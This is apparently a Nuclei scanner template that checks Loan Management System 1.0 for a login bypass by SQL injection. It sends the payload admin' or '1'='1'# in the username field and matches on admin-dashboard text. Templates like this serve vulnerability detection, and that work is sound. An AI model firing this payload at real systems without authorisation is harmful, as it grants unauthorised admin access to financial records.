id: loancms-sqli
info:
  author: arafatansari
  description: 'Loan Management System Login page can be bypassed with a simple SQLi
    to the username parameter.

    '
  metadata:
    verified: true
  name: Loan Management System 1.0 - SQLi Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/50402
  severity: high
  tags: loancms,sqli,auth-bypass,cms
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - window.start_load
    - Welcome back Admin
    - Loan Management System
  - negative: true
    part: body
    type: word
    words:
    - login-form
  matchers-condition: and
  raw:
  - 'POST /ajax.php?action=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin''+or+''1''%3D''1''%23&password=nuclei

    '
  - 'GET /index.php?page=home HTTP/1.1

    Host: {{Hostname}}

    '
